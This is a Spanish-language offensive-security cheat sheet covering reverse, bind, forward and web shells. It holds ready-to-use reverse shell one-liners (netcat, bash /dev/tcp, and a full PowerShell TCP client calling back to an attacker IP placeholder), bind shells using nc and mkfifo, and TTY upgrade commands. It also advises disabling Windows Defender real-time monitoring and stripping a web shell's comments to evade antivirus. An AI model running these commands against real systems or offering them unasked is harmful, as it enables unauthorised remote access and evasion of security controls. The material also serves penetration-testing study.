# 📟 Diferentes tipos de shell

Cuando se obtiene ejecución remota de código en un sistema, el siguiente paso es establecer una shell que permita interactuar con él. Existen tres tipos principales según la dirección de la conexión y el método utilizado.

---

## Reverse Shell

La máquina comprometida inicia la conexión hacia la máquina del atacante. Es el tipo más habitual porque suele sortear firewalls que bloquean conexiones entrantes al objetivo.

**Atacante** — se pone en escucha:

```bash
nc -nlvp 443
```

**Víctima** — envía la shell al atacante:

```bash
nc -e /bin/bash <IP_ATACANTE> 443
```

Alternativa sin `-e` (sistemas que no lo soportan):

```bash
bash -i >& /dev/tcp/<IP_ATACANTE>/443 0>&1
```

### Reverse shell en Windows (PowerShell)

**Atacante:**

```bash
sudo nc -lvnp 443
```

**Víctima:**

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<IP_ATACANTE>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

> ⚠️ Windows Defender puede bloquear este payload. Si tienes privilegios suficientes, desactiva el antivirus antes:
> ```powershell
> Set-MpPreference -DisableRealtimeMonitoring $true
> ```

Para más payloads en distintos lenguajes: [pentestmonkey.net — Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

---

## Bind Shell

El opuesto a la reverse shell: es el atacante quien se conecta al objetivo. La víctima expone una shell en un puerto y el atacante se conecta a él.

**Víctima** — expone una shell en el puerto 4646:

```bash
nc -nlvp 4646 -e /bin/bash
```

**Atacante** — se conecta:

```bash
nc <IP_VICTIMA> 4646
```

### Bind shell con mkfifo (sistemas sin `-e`)

**Víctima:**

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <IP_VICTIMA> 7777 > /tmp/f
```

**Atacante:**

```bash
nc -nv <IP_VICTIMA> 7777
```

---

## Forward Shell

Se usa cuando no es posible establecer una reverse ni una bind shell por restricciones de firewall. Se basa en crear un named pipe con `mkfifo` que simula una consola interactiva redirigiendo el tráfico a través de un archivo FIFO.

Para hacerla interactiva, se puede usar el script de s4vitar:

- [ttyoverhttp — s4vitar/GitHub](https://github.com/s4vitar/ttyoverhttp)

En la función `RunCmd` hay que sustituir la variable `cmd` por el parámetro con el que se ejecuta la shell en la forward shell concreta.

---

## Shell interactiva — TTY upgrade

Al obtener una shell, generalmente no es completamente interactiva (sin autocompletado, sin `sudo`, sin señales). Existen varias formas de elevarla.

### Python

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### /bin/sh -i

```bash
/bin/sh -i
```

### Perl

```bash
perl -e 'exec "/bin/sh";'
```

### Ruby

```bash
ruby -e 'exec "/bin/sh"'
```

### AWK

```bash
awk 'BEGIN {system("/bin/sh")}'
```

### Find

```bash
find . -exec /bin/sh \; -quit
```

### Vim

```bash
vim -c ':!/bin/sh'
```

O desde dentro de vim:

```
:set shell=/bin/sh
:shell
```

### Comprobar permisos tras obtener shell

```bash
# Ver permisos del binario/archivo actual
ls -la <ruta/binario>

# Ver comandos sudo disponibles
sudo -l
```

---

## Web Shell

Una web shell es un script subido al servidor web que permite ejecutar comandos del sistema a través del navegador.

### PHP

Recurso recomendado: [wwwolf-php-webshell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)

### ASP/ASPX — Laudanum

Los shells de Laudanum cubren múltiples lenguajes (ASP, ASPX, JSP, PHP...).

```
https://github.com/jbarcia/Web-Shells/tree/master/laudanum
```

### PowerShell — Antak WebShell

Antak funciona como una consola PowerShell dentro del navegador. Ejecuta cada comando como un nuevo proceso, permite cargar/descargar archivos y codificar comandos.

```bash
# Localizar el archivo en Kali
ls /usr/share/nishang/Antak-WebShell/
# antak.aspx  Readme.md

# Copiar para modificar
cp /usr/share/nishang/Antak-WebShell/antak.aspx /tmp/upload.aspx
```

Antes de subir, editar la línea 14 del archivo para establecer usuario y contraseña de acceso. Recomendable eliminar también los comentarios y el arte ASCII para reducir firmas detectables por AV.
